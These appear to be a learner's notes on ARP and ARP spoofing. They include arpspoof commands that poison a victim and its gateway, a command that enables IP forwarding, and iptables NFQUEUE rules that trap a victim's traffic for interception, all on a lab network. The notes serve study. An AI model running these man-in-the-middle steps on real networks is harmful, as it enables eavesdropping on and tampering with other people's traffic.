ARP - address resolution protocol, helps to connect the client with another client via IP and MAC addresses. ARP links IP address to MAC address.

Client sends a broadcast message with ARP request, e.g. who has 10.0.2.6? All clients on this network will receive this packet. All the devices will ignore the request except the one with the requested IP address. The requested device will get back with its MAC address.

So all the requests and responses are facilitated via ARP, so that IP address could be 'translated' to MAC address.

command `route -n` to get router IP

Some references: [Scapy Docs](https://scapy.readthedocs.io/en/latest/installation.html) and [Arping Usage](https://scapy.readthedocs.io/en/latest/usage.html#arp-ping)

_ARP Spoofing_

`arp -a` cli to see the link of the modem/router to the MAC address
To spoof ARP is to set the IP of the victim as yours (hacker's) so that in the ip-tables of the router is memorized while IP of the router is in the ip-tables of the victim but the hacker presents itself to the victim via ip address of the router. Result: router thinks it is a real client(victim) and the client (victim) thinks it is a router.

`ifconfig` to make sure the eth0 is there
`arpspoof -i eth0 -t 10.0.2.4 10.0.2.1` where the first is IP of the vitim and second is a gateway; it spoofs the target saying that we are the router.
`arpspoof -i eth0 -t 10.0.2.1 10.0.2.7` - to implement the same but with the router. This attack works against ethernet, wireless

`echo 1 > proc/sys/net/ipv4/ip_forward` to enable port forwarding to allow packets to flow through it just as a router

`pip install scapy_http` considered to be deprecated, yet good to look around along with [Berkeley Packet Filter (BPF) syntax](https://biot.com/capstats/bpf.html)

`iptables -I FORWARD -j NFQUEUE --queue-num 0` command to 'trap' victim's packets in a queue. To test locally instead of `FORWARD` to `OUTPUT` + `INPUT` in 2 commands (aka redirecting output and input chains). To set it back `ìptables --flush`

`pip install netfilterqueue` - a module to extract queueing packets, deprecated of Jan 2020
